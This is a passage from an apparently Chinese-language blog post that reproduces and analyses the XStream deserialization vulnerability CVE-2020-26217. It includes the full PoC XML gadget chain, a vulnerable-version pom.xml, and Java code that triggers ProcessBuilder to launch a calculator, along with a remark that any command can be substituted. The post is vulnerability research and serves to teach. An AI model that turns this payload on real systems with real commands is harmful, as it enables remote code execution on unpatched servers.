class="tag">&lt;/<span class="name">expectedModCount</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">java.lang.ProcessBuilder</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">java.lang.ProcessBuilder</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">iter</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">&#x27;javax.imageio.ImageIO$ContainsFilter&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">method</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">class</span>&gt;</span>java.lang.ProcessBuilder<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">method</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">next</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">iterator</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">type</span>&gt;</span>KEYS<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">e</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">in</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.ByteArrayInputStream&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">buf</span>&gt;</span><span class="tag">&lt;/<span class="name">buf</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">pos</span>&gt;</span>0<span class="tag">&lt;/<span class="name">pos</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">mark</span>&gt;</span>0<span class="tag">&lt;/<span class="name">mark</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">count</span>&gt;</span>0<span class="tag">&lt;/<span class="name">count</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">in</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>test<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>环境搭建</p></blockquote><p>idea 新建项目</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230816144345229-16921688486111.png" data-caption="image-20230816144345229"><img src="/../images/Java/deserialization/image-20230816144345229-16921688486111.png" alt="image-20230816144345229"></a></p><p>配置 <code>pom.xml</code> 引入 <code>xstream</code> 漏洞版本依赖,引入后重新 maven 加载项目，<code>在 pom.xml处右键-&gt; maven-&gt; Reload project</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230816162251164.png" data-caption="image-20230816162251164"><img src="/../images/Java/deserialization/image-20230816162251164.png" alt="image-20230816162251164"></a></p><p><code>pom.xml</code> 文件如下</p><div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xstream-2020-26217<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--引入 XStream 1.4.15 依赖--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.thoughtworks.xstream<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xstream<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.13<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">finalName</span>&gt;</span>xstream-2020-26217<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>maven 拉取 xstream 成功后，先在 java 目录下创建一个 java.class 验证 xstream 是否可用，如下：</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230816152445246.png" data-caption="image-20230816152445246"><img src="/../images/Java/deserialization/image-20230816152445246.png" alt="image-20230816152445246"></a></p><p>然后利用该代码进行漏洞调试，代码如下：</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230816154712837.png" data-caption="image-20230816154712837"><img src="/../images/Java/deserialization/image-20230816154712837.png" alt="image-20230816154712837"></a></p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XStreamExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="comment">// 定义一个XML字符串</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> <span class="string">&quot;&lt;map&gt;poc&lt;/map&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建XStream对象</span></span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xstream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将XML字符串反序列化为对象</span></span><br><span class="line">        xstream.fromXML(xml);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>其中 <code>String xml</code> 内容替换为上文提及的官方 <code>poc</code> ， 其中 <code>&lt;command&gt; &lt;/command&gt;</code> 标签填入需要执行的命令，笔者使用的是 <code>Ubuntu</code> ，弹出计算器的命令为 <code>gnome-calculator</code> ,完整代码如下</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230816155321191.png" data-caption="image-20230816155321191"><img src="/../images/Java/deserialization/image-20230816155321191.png" alt="image-20230816155321191"></a></p><div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">import com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line">public class XStreamExample &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        // 定义一个XML字符串</span><br><span class="line">        String xml = &quot;<span class="tag">&lt;<span class="name">map</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;  <span class="tag">&lt;<span class="name">entry</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;      <span class="tag">&lt;<span class="name">flags</span>&gt;</span>0<span class="tag">&lt;/<span class="name">flags</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;      <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;        <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;          <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;            <span class="tag">&lt;<span class="name">contentType</span>&gt;</span>text/plain<span class="tag">&lt;/<span class="name">contentType</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;            <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.SequenceInputStream&#x27;</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;              <span class="tag">&lt;<span class="name">e</span> <span class="attr">class</span>=<span class="string">&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                <span class="tag">&lt;<span class="name">iterator</span> <span class="attr">class</span>=<span class="string">&#x27;javax.imageio.spi.FilterIterator&#x27;</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                  <span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">&#x27;java.util.ArrayList$Itr&#x27;</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                    <span class="tag">&lt;<span class="name">cursor</span>&gt;</span>0<span class="tag">&lt;/<span class="name">cursor</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                    <span class="tag">&lt;<span class="name">lastRet</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">lastRet</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                    <span class="tag">&lt;<span class="name">expectedModCount</span>&gt;</span>1<span class="tag">&lt;/<span class="name">expectedModCount</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                    <span class="tag">&lt;<span class="name">outer-class</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                      <span class="tag">&lt;<span class="name">java.lang.ProcessBuilder</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                        <span class="tag">&lt;<span class="name">command</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>gnome-calculator\n<span class="tag">&lt;/<span class="name">string</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                        <span class="tag">&lt;/<span class="name">command</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                      <span class="tag">&lt;/<span class="name">java.lang.ProcessBuilder</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                    <span class="tag">&lt;/<span class="name">outer-class</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                  <span class="tag">&lt;/<span class="name">iter</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                  <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">&#x27;javax.imageio.ImageIO$ContainsFilter&#x27;</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                    <span class="tag">&lt;<span class="name">method</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                      <span class="tag">&lt;<span class="name">class</span>&gt;</span>java.lang.ProcessBuilder<span class="tag">&lt;/<span class="name">class</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                      <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                      <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                    <span class="tag">&lt;/<span class="name">method</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                    <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                  <span class="tag">&lt;<span class="name">next</span>/&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                <span class="tag">&lt;/<span class="name">iterator</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                <span class="tag">&lt;<span class="name">type</span>&gt;</span>KEYS<span class="tag">&lt;/<span class="name">type</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;              <span class="tag">&lt;/<span class="name">e</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;              <span class="tag">&lt;<span class="name">in</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.ByteArrayInputStream&#x27;</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                <span class="tag">&lt;<span class="name">buf</span>&gt;</span><span class="tag">&lt;/<span class="name">buf</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                <span class="tag">&lt;<span class="name">pos</span>&gt;</span>0<span class="tag">&lt;/<span class="name">pos</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                <span class="tag">&lt;<span class="name">mark</span>&gt;</span>0<span class="tag">&lt;/<span class="name">mark</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;                <span class="tag">&lt;<span class="name">count</span>&gt;</span>0<span class="tag">&lt;/<span class="name">count</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;              <span class="tag">&lt;/<span class="name">in</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;            <span class="tag">&lt;/<span class="name">is</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;            <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;          <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;          <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span>\n&quot; +</span><br><span class="line">                &quot;        <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;        <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;      <span class="tag">&lt;/<span class="name">value</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;    <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;    <span class="tag">&lt;<span class="name">string</span>&gt;</span>test<span class="tag">&lt;/<span class="name">string</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;<span class="tag">&lt;/<span class="name">map</span>&gt;</span>&quot;;</span><br><span class="line"></span><br><span class="line">        // 创建XStream对象</span><br><span class="line">        XStream xstream = new XStream();</span><br><span class="line"></span><br><span class="line">        // 将XML字符串反序列化为对象</span><br><span class="line">        xstream.fromXML(xml);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>执行后，弹出计算器</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230816155458123.png" data-caption="image-20230816155458123"><img src="/../images/Java/deserialization/image-20230816155458123.png" alt="image-20230816155458123"></a></p><p>亦可执行其他命令，如下，创建一个 <code>test.txt</code> 文件</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230816155658396.png" data-caption="image-20230816155658396"><img src="/../images/Java/deserialization/image-20230816155658396.png" alt="image-20230816155658396"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230816155805410.png" data-caption="image-20230816155805410"><img src="/../images/Java/deserialization/image-20230816155805410.png" alt="image-20230816155805410"></a></p><blockquote><p>漏洞分析</p></blockquote><p>先对该 Poc 进行分析，了解其构造过程，方便下面的调试。回到 Poc 分析其 Poc 代码含义，新建 poc.xml 内容为漏洞 Poc，然后利用 <code>firefox</code> 打开 poc.xml ,然后将 Poc 折叠，得到如下图，第一层元素为 <code>&lt;map&gt;&lt;/map&gt;</code> , 第二层元素为 <code>&lt;entry&gt;&lt;/entry&gt;</code> 这两层下带有两个元素 <code>jdk.nashorn.internal.objects.NativeString</code> 和 <code>string</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818155012194.png" data-caption="image-20230818155012194"><img src="/../images/Java/deserialization/image-20230818155012194.png" alt="image-20230818155012194"></a></p><p>利用如下代码，构建一个案例，可清晰了解到其作用</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 导入 XStream 类</span></span><br><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"><span class="comment">// 导入HashMap类</span></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="comment">// 导入Map类</span></span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个名为Person的自定义类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="comment">// 设置属性</span></span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Person 类的构造函数，接受姓名和年龄参数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="comment">// 将传入的姓名赋值给name属性</span></span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="comment">// 将传入的年龄赋值给age属性</span></span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个 MapTest 类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MapTest</span> &#123;</span><br><span class="line"><span class="comment">// 主方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建一个HashMap对象，命名为map</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">// 将一个Person对象作为键，字符串&quot;test&quot;作为值，添加到map中</span></span><br><span class="line">        map.put(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;John&quot;</span>, <span class="number">18</span>), <span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个XStream对象，用于将对象转换为XML</span></span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xstream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line">        <span class="comment">// 将map对象转换为XML字符串，并将结果赋值给xml变量</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> xstream.toXML(map);</span><br><span class="line">        <span class="comment">// 打印XML字符串到控制台</span></span><br><span class="line">        System.out.println(xml);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>运行后结果如下：</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818162034463.png" data-caption="image-20230818162034463"><img src="/../images/Java/deserialization/image-20230818162034463.png" alt="image-20230818162034463"></a></p><p>由代码可知，<code>map</code> 作为 <code>HashMap()</code> 的对象，然后将 <code>Person</code> 的键 <code>(&quot;John&quot;, 18)</code>、键值 <code>(&quot;test&quot;)</code> 加载到 <code>map</code> 中，然后利用 <code>xstream.toXML()</code> 序列化为 <code>xml</code> 格式</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818161935225.png" data-caption="image-20230818161935225"><img src="/../images/Java/deserialization/image-20230818161935225.png" alt="image-20230818161935225"></a></p><p>通过上面分析可知，若利用 XStream 进行序列化会利用 HashMap() 进而生成如下格式：</p><div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">map对象名</span>&gt;</span>键<span class="tag">&lt;/<span class="name">map对象名</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>值<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>将 Poc 再展开一层，通过上面分析可知，整个 Poc 可以看作为一个 map 集合，然后 map 集合下面有许多元素，其中 <code>jdk.nashorn.internal.objects.NativeString</code> 为 <code>HashMap()</code> 的对象， <code>jdk.nashorn.internal.objects.NativeString</code> 又带有 <code>&lt;flag&gt;</code> 和 <code>&lt;value&gt;</code> 属性，其值分别为 <code>0</code>、<code>com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</code> </p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818162426050.png" data-caption="image-20230818162426050"><img src="/../images/Java/deserialization/image-20230818162426050.png" alt="image-20230818162426050"></a></p><p>再展开 value 值后得到更多具体的元素，这样在调试代码时可以清晰地知道该追踪哪些代码进行分析</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818163930547.png" data-caption="image-20230818163930547"><img src="/../images/Java/deserialization/image-20230818163930547.png" alt="image-20230818163930547"></a></p><p>通过上面分析可知，XStream 在进行序列化前，(该Poc为例) 需先将 <code>&lt;jdk.nashorn.internal.objects.NativeString&gt;</code>、<code>&lt;string&gt;test&lt;/string&gt;</code> 该键值对利用 <code>HashMap()</code> 获取其 <code>hash</code> 